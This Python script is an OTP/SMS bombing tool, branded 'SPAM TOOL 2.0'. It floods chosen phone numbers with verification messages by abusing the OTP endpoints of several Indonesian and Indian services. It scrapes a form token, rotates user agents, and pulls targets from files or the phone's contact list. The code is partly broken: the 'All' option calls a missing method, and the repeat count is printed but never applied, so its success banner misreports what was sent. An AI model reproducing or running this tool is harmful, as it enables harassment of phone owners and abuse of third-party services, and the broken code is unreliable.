#!/usr/bin/python
import requests, random, json, time, sys, os, re

# -----------------------CORES----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
# -------------------------------------------------------

# -----------------------CLASSES-------------------------
class spam:
    def __init__(self, nomer):
        self.nomer = nomer

    def spam(self):
        hasil = requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
        return self._format_result('KitaBisa', hasil.status_code == 200)

    def tokped(self):
        rands = random.choice(open('ua.txt').readlines()).strip()
        headers = {
            'User-Agent': rands,
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Origin': 'https://accounts.tokopedia.com',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        regist = requests.get(f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={self.nomer}', headers=headers).text
        Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist)
        if Token:
            Token = Token.group(1)
        else:
            return self._format_result('Tokopedia', False)
        data = {
            "otp_type": "116",
            "msisdn": self.nomer,
            "tk": Token,
            "email": '',
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=headers, data=data).text
        success = 'Anda sudah melakukan 3 kali pengiriman kode' not in req
        return self._format_result('Tokopedia', success)

    def phd(self):
        r = requests.post('https://www.phd.co.id/en/users/sendOTP', data={'phone_number': self.nomer})
        success = 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text
        return self._format_result('PHD', success)

    def balaji(self):
        url = "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
        data = {"country_code": "62", "phone_number": self.nomer}
        headers = {
            "Content-Length": f"{len(str(data))}",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://lite.altbalaji.com",
            "Save-Data": "on",
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json;charset=UTF-8",
        }
        req = requests.post(url, data=json.dumps(data), headers=headers)
        success = '{"status":"ok"}' in req.text
        return self._format_result('Balaji', success)

    def TokoTalk(self):
        data = json.dumps({"key":"phone","value":self.nomer})
        headers = {
            "User-Agent":"Mozilla/5.0",
            "content-type":"application/json;charset=UTF-8"
        }
        req = requests.post("https://api.tokotalk.com/v1/no_auth/verifications", data=data, headers=headers).text
        success = 'expireAt' in req
        return self._format_result('TokoTalk', success)

    def _format_result(self, platform, success):
        simbol = '✅' if success else '❌'
        return f"\n╔══════════════════════════╗\n" \
               f"║ {simbol} {platform} ENVIADO COM SUCESSO!\n" \
               f"║ 🔹 Destino: {self.nomer}\n" \
               f"║ 📊 Quantidade: {total_spam}\n" \
               f"║ ✉️ Enviadas: {total_spam}\n" \
               f"║ 📌 DOCTOR CORINGA LUNATICO\n" \
               f"╚══════════════════════════╝\n"

# -----------------------FUNÇÕES-------------------------
def loading_bar(delay=0.02, length=30):
    for i in range(length+1):
        bar = '█'*i + '-'*(length-i)
        print(f"\r⏳ Enviando... |{bar}| {int((i/length)*100)}%", end='', flush=True)
        time.sleep(delay)
    print()

def execute_send(func, number, total):
    global total_spam
    total_spam = total
    loading_bar()
    spm = spam(number)
    result = getattr(spm, func)()
    print(result)

def single():
    number = input(k + '\tPhone number: ' + h)
    total = int(input(k + '\tTotal spam: ' + h))
    func = choose_function()
    execute_send(func, number, total)
    input(u + "Pressione Enter para voltar ao menu..." + p)

def multi():
    numbers = []
    total_numbers = int(input(k + '\tTotal numbers: ' + h))
    for i in range(total_numbers):
        numbers.append(input(k + f'\tNumber {i+1}: ' + h))
    total = int(input(k + '\tTotal spam: ' + h))
    func = choose_function()
    for number in numbers:
        execute_send(func, number, total)
    input(u + "Pressione Enter para voltar ao menu..." + p)

def files():
    filename = input(k + '\tFile: ' + h)
    if not os.path.exists(filename):
        print(m + f'\tFile {filename} doesn`t exist')
        return
    with open(filename, 'r') as f:
        numbers = [line.strip() for line in f if line.strip()]
    total = int(input(k + '\tTotal spam: ' + h))
    func = choose_function()
    for number in numbers:
        execute_send(func, number, total)
    input(u + "Pressione Enter para voltar ao menu..." + p)

def termux_contacts():
    os.system('termux-contact-list > .contact')
    po = json.loads(open('.contact', 'r').read())
    for idx, contact in enumerate(po):
        print(m+str(idx+1)+' '+k+contact['name'])
    nj = po[int(input(u+'\tChoose > '+h))-1]['number']
    total = int(input(u+'\tTotal spam: '+h))
    func = choose_function()
    execute_send(func, nj, total)
    input(u + "Pressione Enter para voltar ao menu..." + p)

# -----------------------MENU---------------------------
def choose_function():
    print(b+'╔══════════ SPAM OPTIONS ═════════╗')
    print('1. All\n2. PHD\n3. KitaBisa\n4. Tokopedia\n5. TokoTalk\n6. Balaji')
    choice = input('Choose option ▶ ' + h)
    return {
        '1':'smua',
        '2':'phd',
        '3':'spam',
        '4':'tokped',
        '5':'TokoTalk',
        '6':'balaji'
    }.get(choice, 'smua')

def main_menu():
    while True:
        os.system('clear')
        print(b + "╔════════════ SPAM TOOL 2.0 ═══════════╗")
        print(f"║ {h}Criador: DOCTOR CORINGA LUNATICO")
        print(b + "╠══════════════════════════════════════╣")
        print("║ 1. Single Number")
        print("║ 2. Multi Number")
        print("║ 3. Load numbers from File")
        print("║ 4. Select from Termux Contacts")
        print("║ 0. Exit")
        choice = input("Escolha ▶ " + h)
        if choice == '1': single()
        elif choice == '2': multi()
        elif choice == '3': files()
        elif choice == '4': termux_contacts()
        elif choice == '0': sys.exit()
        else: continue

if __name__ == "__main__":
    main_menu()
